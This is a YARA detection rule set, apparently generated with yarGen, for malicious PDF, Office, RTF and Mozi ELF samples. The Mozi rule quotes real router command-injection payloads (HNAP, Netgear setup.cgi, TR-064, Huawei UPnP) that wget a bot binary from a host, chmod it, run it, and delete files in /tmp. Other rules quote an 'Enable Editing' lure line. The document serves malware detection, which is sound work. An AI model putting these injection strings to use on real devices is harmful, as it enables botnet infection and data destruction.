/*
   YARA Rule Set
   Author: RamonOrtiz
   Date: 2021-08-15
   Identifier: DOC
   Reference: https://github.com/Neo23x0/yarGen
*/

/* Rule Set ----------------------------------------------------------------- */

rule sig_5ea7a724d99fab3f05f50dccd57db59451334ac8640c532d426df319dad55c9e {
   meta:
      description = "DOC - file 5ea7a724d99fab3f05f50dccd57db59451334ac8640c532d426df319dad55c9e.pdf"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "5ea7a724d99fab3f05f50dccd57db59451334ac8640c532d426df319dad55c9e"
   strings:
      $s1 = "qqqqyy" fullword ascii /* reversed goodware string 'yyqqqq' */
      $s2 = "            xmlns:pdfx=\"http://ns.adobe.com/pdfx/1.3/\">" fullword ascii
      $s3 = "            xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\"" fullword ascii
      $s4 = "            xmlns:pdf=\"http://ns.adobe.com/pdf/1.3/\"" fullword ascii
      $s5 = "            xmlns:xmpMM=\"http://ns.adobe.com/xap/1.0/mm/\"" fullword ascii
      $s6 = "<</DecodeParms<</Columns 4/Predictor 12>>/Filter/FlateDecode/ID[<FB0C810DD593F54B865AA140E9B29259><1AD6BA2816860940A3E900A4AF919" ascii
      $s7 = "<</ADBE_FT<</BreadCrumbs[<</Action(Set)/AppVersion(1)/Application(PDFMaker)/PDFLBuildDate(Sep 13 2017)/TimeStamp(D:2018040402162" ascii
      $s8 = "<</DecodeParms<</Columns 5/Predictor 12>>/Filter/FlateDecode/ID[<FB0C810DD593F54B865AA140E9B29259><FE29CC1D5A17A14F80B1C5EC8AB6A" ascii
      $s9 = "<</DecodeParms<</Columns 4/Predictor 12>>/Filter/FlateDecode/ID[<FB0C810DD593F54B865AA140E9B29259><B6F9C974D0AF734F856F33AD2E6A1" ascii
      $s10 = "<</DecodeParms<</Columns 4/Predictor 12>>/Filter/FlateDecode/ID[<FB0C810DD593F54B865AA140E9B29259><D9D209A6167CF34F959B5B43E7E2A" ascii
      $s11 = "SSS%%%" fullword ascii /* reversed goodware string '%%%SSS' */
      $s12 = "111)))" fullword ascii /* reversed goodware string ')))111' */
      $s13 = "0R3R1R2R0" fullword ascii /* base64 encoded string 'GtuGdt' */
      $s14 = "<</Differences[24/breve/caron/circumflex/dotaccent/hungarumlaut/ogonek/ring/tilde 39/quotesingle 96/grave 128/bullet/dagger/dagg" ascii
      $s15 = "<</JS 536 0 R/S/JavaScript>>" fullword ascii
      $s16 = "<</JS 508 0 R/S/JavaScript>>" fullword ascii
      $s17 = "W)))!!!" fullword ascii
      $s18 = "<</JS 530 0 R/S/JavaScript>>" fullword ascii
      $s19 = "<</JS 533 0 R/S/JavaScript>>" fullword ascii
      $s20 = "<</EmbeddedFiles 497 0 R/JavaScript 493 0 R>>" fullword ascii
   condition:
      uint16(0) == 0x5025 and filesize < 2000KB and
      8 of them
}

rule sig_39f3c234507061d2b99efe08be1b29aeb3d0a0e699c733f5460172e3681b45a8 {
   meta:
      description = "DOC - file 39f3c234507061d2b99efe08be1b29aeb3d0a0e699c733f5460172e3681b45a8.xlsx"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "39f3c234507061d2b99efe08be1b29aeb3d0a0e699c733f5460172e3681b45a8"
   strings:
      $s1 = "xl/printerSettings/printerSettings2.bin" fullword ascii
      $s2 = "xl/embeddings/oleObject2.bin" fullword ascii
      $s3 = "/iNnu:\"d" fullword ascii
      $s4 = "xl/printerSettings/printerSettings1.bin" fullword ascii
      $s5 = "xl/embeddings/oleObject1.bin" fullword ascii
      $s6 = "xl/diagrams/layout1.xml" fullword ascii
      $s7 = "xl/drawings/vmlDrawing2.vml" fullword ascii
      $s8 = "xl/media/image5.png" fullword ascii
      $s9 = "xl/worksheets/sheet3.xml" fullword ascii
      $s10 = "xl/embeddings/oleObject2.binPK" fullword ascii
      $s11 = "xl/printerSettings/printerSettings2.binPK" fullword ascii
      $s12 = "xl/worksheets/_rels/sheet1.xml.relsPK" fullword ascii
      $s13 = "xl/drawings/_rels/drawing1.xml.rels" fullword ascii
      $s14 = "xl/media/image8.emf" fullword ascii
      $s15 = "xl/diagrams/quickStyle1.xml" fullword ascii
      $s16 = "xl/worksheets/sheet2.xml" fullword ascii
      $s17 = "xl/embeddings/oleObject1.binPK" fullword ascii
      $s18 = "xl/media/image6.emf" fullword ascii
      $s19 = "xl/drawings/drawing1.xml" fullword ascii
      $s20 = "xl/drawings/_rels/vmlDrawing2.vml.rels" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 4000KB and
      8 of them
}

rule sig_3b0579fb1efe349b78c99e17933b5be37b61fe3bb532e79ad33267b8c05c3672 {
   meta:
      description = "DOC - file 3b0579fb1efe349b78c99e17933b5be37b61fe3bb532e79ad33267b8c05c3672.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "3b0579fb1efe349b78c99e17933b5be37b61fe3bb532e79ad33267b8c05c3672"
   strings:
      $x1 = "<w:wordDocument xmlns:aml=\"http://schemas.microsoft.com/aml/2001/core\" xmlns:wpc=\"http://schemas.microsoft.com/office/word/20" ascii
      $s2 = "wordprocessingCanvas\" xmlns:cx=\"http://schemas.microsoft.com/office/drawing/2014/chartex\" xmlns:cx1=\"http://schemas.microsof" ascii
      $s3 = "schemas.microsoft.com/office/drawing/2016/5/9/chartex\" xmlns:cx4=\"http://schemas.microsoft.com/office/drawing/2016/5/10/charte" ascii
      $s4 = "rmats.org/markup-compatibility/2006\" xmlns:aink=\"http://schemas.microsoft.com/office/drawing/2016/ink\" xmlns:am3d=\"http://sc" ascii
      $s5 = "rosoft.com/office/word/2003/wordml/sp2\"/><o:DocumentProperties><o:Author>admin</o:Author><o:LastAuthor>alexpetrenko@mail.ru</o:" ascii
      $s6 = "bSBhcHBsaWNhdGlvbi92bmQuYWRvYmUucGhvdG9zaG9wIHRvIGltYWdlL3BuZyIvPiA8cmRmOmxp" fullword ascii /* base64 encoded string 'm application/vnd.adobe.photoshop to image/png"/> <rdf:li' */
      $s7 = "OTg4NTExLWRhNGEtNzI0OS05OTY2LWNhMmNiZGUxOThjYiIgc3RFdnQ6d2hlbj0iMjAyMS0wNC0w" fullword ascii /* base64 encoded string '988511-da4a-7249-9966-ca2cbde198cb" stEvt:when="2021-04-0' */
      $s8 = "PSJmcm9tIGltYWdlL3BuZyB0byBhcHBsaWNhdGlvbi92bmQuYWRvYmUucGhvdG9zaG9wIi8+IDxy" fullword ascii /* base64 encoded string '="from image/png to application/vnd.adobe.photoshop"/> <r' */
      $s9 = "aWQ6cGhvdG9zaG9wOmFiNWRjZmQzLWViNjctYjk0MS04Yzg0LTljMWYwZjhkMWU1MjwvcmRmOmxp" fullword ascii /* base64 encoded string 'id:photoshop:ab5dcfd3-eb67-b941-8c84-9c1f0f8d1e52</rdf:li' */
      $s10 = "m:vml\" xmlns:w10=\"urn:schemas-microsoft-com:office:word\" xmlns:w=\"http://schemas.microsoft.com/office/word/2003/wordml\" xml" ascii
      $s11 = "wsp=\"http://schemas.microsoft.com/office/word/2003/wordml/sp2\" xmlns:sl=\"http://schemas.microsoft.com/schemaLibrary/2003/core" ascii
      $s12 = "<w:wordDocument xmlns:aml=\"http://schemas.microsoft.com/aml/2001/core\" xmlns:wpc=\"http://schemas.microsoft.com/office/word/20" ascii
      $s13 = "g/2016/5/12/chartex\" xmlns:cx7=\"http://schemas.microsoft.com/office/drawing/2016/5/13/chartex\" xmlns:cx8=\"http://schemas.mic" ascii
      $s14 = "=\"http://schemas.microsoft.com/office/word/2003/auxHint\" xmlns:wne=\"http://schemas.microsoft.com/office/word/2006/wordml\" xm" ascii
      $s15 = " xmlns:cx5=\"http://schemas.microsoft.com/office/drawing/2016/5/11/chartex\" xmlns:cx6=\"http://schemas.microsoft.com/office/dra" ascii
      $s16 = "ft.com/office/drawing/2016/5/14/chartex\" xmlns:dt=\"uuid:C2F41010-65B3-11d1-A29F-00AA00C14882\" xmlns:mc=\"http://schemas.openx" ascii
      $s17 = "m/office/drawing/2015/9/8/chartex\" xmlns:cx2=\"http://schemas.microsoft.com/office/drawing/2015/10/21/chartex\" xmlns:cx3=\"htt" ascii
      $s18 = "AAAAAAAAAB" ascii /* base64 encoded string '       ' */
      $s19 = "</w:binData><v:shape id=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:467.25pt;height:107.25pt\"><v:imagedata src=\"wordml" ascii
      $s20 = "cy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZUV2ZW50IyIgeG1sbnM6c3RSZWY9Imh0" fullword ascii /* base64 encoded string 's.adobe.com/xap/1.0/sType/ResourceEvent#" xmlns:stRef="ht' */
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_5389f6cc8fe23e7e79110fd518666e72f1a6baf635168ef52afdc69f1288d524 {
   meta:
      description = "DOC - file 5389f6cc8fe23e7e79110fd518666e72f1a6baf635168ef52afdc69f1288d524.elf"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "5389f6cc8fe23e7e79110fd518666e72f1a6baf635168ef52afdc69f1288d524"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $x2 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope//\" s:encodingStyle=\"http://schemas.xmls" ascii
      $x3 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $x4 = "SOAPAction: http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://%s:%d/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi" ascii
      $x5 = "SOAPAction: http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://%s:%d/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi" ascii
      $x6 = "<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"" ascii
      $x7 = "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"htt" ascii
      $x8 = "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://%s:%d/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/" ascii
      $x9 = "iption><NewPortMappingDescription><NewLeaseDuration></NewLeaseDuration><NewInternalClient>`cd /tmp;rm -rf *;wget http://%s:%d/Mo" ascii
      $x10 = "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://%s:%d/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/" ascii
      $x11 = "ver1>`cd /tmp && rm -rf * && /bin/busybox wget http://%s:%d/Mozi.m && chmod 777 /tmp/tr064 && /tmp/tr064 tr064`</NewNTPServer1><" ascii
      $x12 = "orks.com/HNAP1/\"><PortMappingDescription>foobar</PortMappingDescription><InternalClient>192.168.0.100</InternalClient><PortMapp" ascii
      $x13 = ">/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/va" ascii
      $x14 = ">/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/va" ascii
      $s15 = " -g %s:%d -l /tmp/huawei -r /Mozi.m;chmod -x huawei;/tmp/huawei huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDow" ascii
      $s16 = "GET /shell?cd+/tmp;rm+-rf+*;wget+http://%s:%d/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" fullword ascii
      $s17 = "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://%s:%d/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron" fullword ascii
      $s18 = "r/.x&&cd /var;rm -rf i;wget http://%s:%d/bin.sh ||curl -O http://%s:%d/bin.sh ||/bin/busybox wget http://%s:%d/bin.sh;chmod 777 " ascii
      $s19 = "r/.x&&cd /var;rm -rf i;wget http://%s:%d/i ||curl -O http://%s:%d/i ||/bin/busybox wget http://%s:%d/i;chmod 777 i ||(cp /bin/ls" ascii
      $s20 = "lient>cd /var/; wget http://%s:%d/Mozi.m; chmod +x Mozi.m; ./Mozi.m</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMapping" ascii
   condition:
      uint16(0) == 0x457f and filesize < 900KB and
      1 of ($x*) and all of them
}

rule sig_2ada03cc7424b371b671f5c63e3c5644d747368287f6c68145e76de163967286 {
   meta:
      description = "DOC - file 2ada03cc7424b371b671f5c63e3c5644d747368287f6c68145e76de163967286.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "2ada03cc7424b371b671f5c63e3c5644d747368287f6c68145e76de163967286"
   strings:
      $s1 = "a185a3418" ascii /* base64 encoded string 'k_9k~5' */
      $s2 = "~&;6'9>;#=5?>?`'5&=|$5;~)!<'?%1,,/;" fullword ascii /* hex encoded string 'iUQ' */
      $s3 = "<:61*<]&^'" fullword ascii /* hex encoded string 'a' */
      $s4 = ",4??0]-;;``%5~!/?8$>%5[%3?>4>~3??>|=" fullword ascii /* hex encoded string '@XSC' */
      $s5 = "7?|9?/]@'20/" fullword ascii /* hex encoded string 'y ' */
      $s6 = "=.`/(%:&77.^]??" fullword ascii /* hex encoded string 'w' */
      $s7 = ",|+?!,4@-4/%" fullword ascii /* hex encoded string 'D' */
      $s8 = "|(#?'52@?" fullword ascii /* hex encoded string 'R' */
      $s9 = "`63@!^+??+2!?8" fullword ascii /* hex encoded string 'c(' */
      $s10 = "&=%;%>?,/@2;?=^4^<" fullword ascii /* hex encoded string '$' */
      $s11 = "$%<4-%?`!?7);^" fullword ascii /* hex encoded string 'G' */
      $s12 = "2]*0.;??;?]" fullword ascii /* hex encoded string ' ' */
      $s13 = "?5?(=?#~~%?_3__~=[(" fullword ascii /* hex encoded string 'S' */
      $s14 = ".'=`7!`@`8)<[`?,3[;`2`6`~1" fullword ascii /* hex encoded string 'x2a' */
      $s15 = "$4^&^-7[]*|" fullword ascii /* hex encoded string 'G' */
      $s16 = "/2=??5^#$" fullword ascii /* hex encoded string '%' */
      $s17 = "?2]%+>%*[5(" fullword ascii /* hex encoded string '%' */
      $s18 = "3]%:?*8+47);" fullword ascii /* hex encoded string '8G' */
      $s19 = ".6**)^(|=$[[1,4?1?/]5?`^/|9(?|?" fullword ascii /* hex encoded string 'aAY' */
      $s20 = "+'?^#$@3(],|2" fullword ascii /* hex encoded string '2' */
   condition:
      uint16(0) == 0x5c7b and filesize < 300KB and
      8 of them
}

rule sig_71ab378df1ca7ad64f7fb4754d82d33df4d066af5e83a60ffd431726d51f1e3f {
   meta:
      description = "DOC - file 71ab378df1ca7ad64f7fb4754d82d33df4d066af5e83a60ffd431726d51f1e3f.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "71ab378df1ca7ad64f7fb4754d82d33df4d066af5e83a60ffd431726d51f1e3f"
   strings:
      $s1 = "$3_4_7!-*$~1|-_%%?-3*(`=2<?>``2;+8?#%]@=?_%" fullword ascii /* hex encoded string '4q2(' */
      $s2 = ".<3!:6%.6(/;?+,)^1~&/!2^=&*|#?+7<&*:" fullword ascii /* hex encoded string '6a'' */
      $s3 = "%2^[9<?`5~^&82+768" fullword ascii /* hex encoded string ')X'h' */
      $s4 = "@.(5?'2<=[:+_.?" fullword ascii /* hex encoded string 'R' */
      $s5 = "=!-?)^%3?%]6^2![[&$|`#!8|>." fullword ascii /* hex encoded string '6(' */
      $s6 = "<<44$*/-%@" fullword ascii /* hex encoded string 'D' */
      $s7 = "3%^&?=%!|@?-:&*`-,_6=$?]" fullword ascii /* hex encoded string '6' */
      $s8 = "4:?+?*5%%-?@" fullword ascii /* hex encoded string 'E' */
      $s9 = "~/!2?||?~_)//*$;*>3[-%;~&($-" fullword ascii /* hex encoded string '#' */
      $s10 = "`)2%?>;%]?(?;4|?_>-^#*???`=$" fullword ascii /* hex encoded string '$' */
      $s11 = "?+&>~*??;675.?&676&6~8]-62!?&):%%?)?~+[]/`%=" fullword ascii /* hex encoded string 'gVvhb' */
      $s12 = "'@-/_&;-6#,3?4%0^)]:" fullword ascii /* hex encoded string 'c@' */
      $s13 = "*??$;]$73:" fullword ascii /* hex encoded string 's' */
      $s14 = "56$]^)?5~2=$%,,`$]77[:" fullword ascii /* hex encoded string 'VRw' */
      $s15 = "*7^~>|!8*" fullword ascii /* hex encoded string 'x' */
      $s16 = "@*)6(-#1#)" fullword ascii /* hex encoded string 'a' */
      $s17 = "5_9=7`@5]$" fullword ascii /* hex encoded string 'Yu' */
      $s18 = " \\*\\bin000" fullword ascii
      $s19 = "\\objh7420{\\*\\objdata178972 {{{{{{{{{{{{{{{{{{{{{{{{{{{{{\\bin00            {\\*\\objdata178972            }            \\fiel" ascii
      $s20 = "fecdd5284" ascii
   condition:
      uint16(0) == 0x5c7b and filesize < 200KB and
      8 of them
}

rule sig_8573e361985adafebf286a7115b0ff783f3432defcb415d45df2c46f04104cfe {
   meta:
      description = "DOC - file 8573e361985adafebf286a7115b0ff783f3432defcb415d45df2c46f04104cfe.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "8573e361985adafebf286a7115b0ff783f3432defcb415d45df2c46f04104cfe"
   strings:
      $s1 = "[`3)!2_/&=6_(2?<`&>0?%%'8?8-{\\object65648964                            \\''                            \\objautlink34063390\\|" ascii
      $s2 = "update4435919244359192\\objw3623\\objh9842{\\*\\objdata893425 {{{{{\\bin0000        {\\*\\objdata893425        }        \\passwo" ascii
      $s3 = "6|0'%>$?~%3>?-5?~" fullword ascii /* hex encoded string '`5' */
      $s4 = "]?4[:4^%?&" fullword ascii /* hex encoded string 'D' */
      $s5 = "_2*-/136?.]43:/@|7?-?`%_==5-" fullword ascii /* hex encoded string '!6Cu' */
      $s6 = "(4&&.@~'~`0.]?|5469!)?;=)$%4(?.2:4?*?5." fullword ascii /* hex encoded string '@TiBE' */
      $s7 = ";#@<?7.?<#:_3;" fullword ascii /* hex encoded string 's' */
      $s8 = "$[=3|95.4:=?(" fullword ascii /* hex encoded string '9T' */
      $s9 = "(705*@_1'_=-5>;!%5%<" fullword ascii /* hex encoded string 'pQU' */
      $s10 = "6?>`??$?%,*4`]&^" fullword ascii /* hex encoded string 'd' */
      $s11 = "-2;=?,>8|~>,?;%>+%?<" fullword ascii /* hex encoded string '(' */
      $s12 = "_#>|?3<?[.+=7;-~3943<$" fullword ascii /* hex encoded string '79C' */
      $s13 = "%*])-&=$/2%7%" fullword ascii /* hex encoded string ''' */
      $s14 = "'50&$5?1-%-]<&`>@" fullword ascii /* hex encoded string 'PQ' */
      $s15 = ";2!?=6/<@';?+" fullword ascii /* hex encoded string '&' */
      $s16 = "=$7??]%<2~" fullword ascii /* hex encoded string 'r' */
      $s17 = "7=;=0??.!" fullword ascii /* hex encoded string 'p' */
      $s18 = "_'4:*[@+&8^`=_!<.?-" fullword ascii /* hex encoded string 'H' */
      $s19 = "5)``8:->'?3^7?^" fullword ascii /* hex encoded string 'X7' */
      $s20 = " \\*\\bin000" fullword ascii
   condition:
      uint16(0) == 0x5c7b and filesize < 300KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8_79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0_0 {
   meta:
      description = "DOC - from files f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8.doc, 79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619.doc, e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33.doc, 433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694.doc, 455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8"
      hash2 = "79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619"
      hash3 = "e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33"
      hash4 = "433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694"
      hash5 = "455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7"
   strings:
      $s1 = "a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4' */
      $s2 = "0a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a08" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO' */
      $s3 = "323432332A32333435333536372F323238393537343534332B" ascii /* hex encoded string '2423*23453567/2289574543+' */
      $s4 = "37353437363234372D32373638373536372D39363736353736" ascii /* hex encoded string '75476247-27687567-9676576' */
      $s5 = "663839336A74203D2022323433323432332A32333435333536" ascii /* hex encoded string 'f893jt = "2432423*2345356' */
      $s6 = "353433362F32353637353437363234372D3237363837353637" ascii /* hex encoded string '5436/25675476247-27687567' */
      $s7 = "6967323365303269337230323975347234336A3839756F746A" ascii /* hex encoded string 'ig23e02i3r029u4r43j89uotj' */
      $s8 = "2B333435383638393332343732332A32373835363334383735" ascii /* hex encoded string '+3458689324723*2785634875' */
      $s9 = "3537343534332B333435383638393332343732332A32373835" ascii /* hex encoded string '574543+3458689324723*2785' */
      $s10 = "323365303269337230323975347234336A3839756F746A6638" ascii /* hex encoded string '23e02i3r029u4r43j89uotjf8' */
      $s11 = "4F4C45324C496E6B" ascii /* hex encoded string 'OLE2LInk' */
      $s12 = "2D32373638373536372D39363736353736332D333536373634" ascii /* hex encoded string '-27687567-96765763-356764' */
      $s13 = "2D33353637363438363438342B333638393335363334383735" ascii /* hex encoded string '-35676486484+368935634875' */
      $s14 = "337230323975347234336A3839756F746A663839336A74203D" ascii /* hex encoded string '3r029u4r43j89uotjf893jt =' */
      $s15 = "3438363438342B333638393335363334383735363334373835" ascii /* hex encoded string '486484+368935634875634785' */
      $s16 = "323738353633343837353433362F3235363735343736323437" ascii /* hex encoded string '2785634875436/25675476247' */
      $s17 = "3638373536372D39363736353736332D333536373634383634" ascii /* hex encoded string '687567-96765763-356764864' */
      $s18 = "3437363234372D32373638373536372D39363736353736332D" ascii /* hex encoded string '476247-27687567-96765763-' */
      $s19 = "34336A3839756F746A663839336A74203D2022323433323432" ascii /* hex encoded string '43j89uotjf893jt = "243242' */
      $s20 = "33362F32353637353437363234372D32373638373536372D39" ascii /* hex encoded string '36/25675476247-27687567-9' */
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8_433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff_1 {
   meta:
      description = "DOC - from files f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8.doc, 433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694.doc, 455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8"
      hash2 = "433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694"
      hash3 = "455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7"
   strings:
      $s1 = "\\lsdpriority49 \\lsdlocked0 List Table 5 Colorful 5;\\lsdpriority50 \\lsdlocked0 List Table 5 Dark Accent 5;\\lsdpriority51 \\l" ascii
      $s2 = "\\lsdpriority49 \\lsdlocked0 List Table 5 Colorful 5;\\lsdpriority50 \\lsdlocked0 List Table 5 Dark Accent 5;\\lsdpriority51 \\l" ascii
      $s3 = "\\lsdpriority50 \\lsdlocked0 List Table 5 Dark Accent 6;\\lsdpriority51 \\lsdlocked0 List Table 6 Colorful Accent 6;\\lsdpriorit" ascii
      $s4 = "\\lsdpriority50 \\lsdlocked0 List Table 5 Dark Accent 6;\\lsdpriority51 \\lsdlocked0 List Table 6 Colorful Accent 6;\\lsdpriorit" ascii
      $s5 = "\\ldppimEMihiddenn3 \\lsdunhideused1 \\lsdqformat3 \\lsdpriority9 \\lsdlocked0 heading 2;\\ldppimEMihiddenn3 \\lsdunhideused1 " ascii
      $s6 = "\\ldppimEMihiddenn3 \\lsdunhideused1 \\lsdqformat2 \\lsdpriority9 \\lsdlocked0 heading 6;\\ldppimEMihiddenn3 \\lsdunhideused1 " ascii
      $s7 = "\\ldppimEMihiddenn3 \\lsdunhideused1 \\lsdqformat2 \\lsdpriority9 \\lsdlocked0 heading 6;\\ldppimEMihiddenn3 \\lsdunhideused1 " ascii
      $s8 = "\\ldppimEMihiddenn3 \\lsdunhideused1 \\lsdqformat3 \\lsdpriority9 \\lsdlocked0 heading 2;\\ldppimEMihiddenn3 \\lsdunhideused1 " ascii
      $s9 = "Microsoft Office does not work in email Preview.\\line Please download the document and click {\\b Enable Editing} when opening." ascii
      $s10 = "\\ldppimEMihiddenn3 \\lsdunhideused1 \\lsdqformat2 \\lsdpriority9 \\lsdlocked0 heading 8;\\ldppimEMihiddenn3 \\lsdunhideused2 " ascii
      $s11 = "\\ldppimEMihiddenn3 \\lsdunhideused1 \\lsdqformat2 \\lsdpriority9 \\lsdlocked0 heading 8;\\ldppimEMihiddenn3 \\lsdunhideused2 " ascii
      $s12 = "at2 \\lsdpriority9 \\lsdlocked0 heading 6;\\ldppimEMihiddenn3 \\lsdunhideused1 \\lsdqformat2 \\lsdpriority9 \\lsdlocked0 heading" ascii
      $s13 = "at2 \\lsdpriority9 \\lsdlocked0 heading 3;\\ldppimEMihiddenn3 \\lsdunhideused1 \\lzdqformat2 \\lsdpriority9 \\lsdlocked0 heading" ascii
      $s14 = "at2 \\lsdpriority9 \\lsdlocked0 heading 9;\\ldppimEMihiddenn3 \\lsdunhxckeused1" fullword ascii
      $s15 = "446767665c \\lsepriority9 \\lsdlocked0 heading 1;" fullword ascii
      $s16 = "1091D14090A020101011607080116000204100201010E19140410020101090A0204100201010E191401010101140002011415050101041002011607080116000" ascii
      $s17 = "010D01010E0F02010410020101010101010410020101010104100201010101010101010101010101010D01010E0F02010101090A0002010101060C01090A0C01" ascii
      $s18 = "501010101010101010410020101090A110A00000000000B01010101010101010101090A0201010101041002010114150501041002010101010410020101090A0" ascii
      $s19 = "1010D01010E0F02010101090A0002010101060C01090A0C0104100201010101010410020101010101010101010101010100000201010101010104100000000B0" ascii
      $s20 = "01010101010101010104100201010101041000020104100201041000000201010410121401160708010410151C0708010410000201041002010E1A1B0A020101" ascii
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8_e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead_2 {
   meta:
      description = "DOC - from files f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8.doc, e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33.doc, 433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694.doc, 455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8"
      hash2 = "e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33"
      hash3 = "433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694"
      hash4 = "455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7"
   strings:
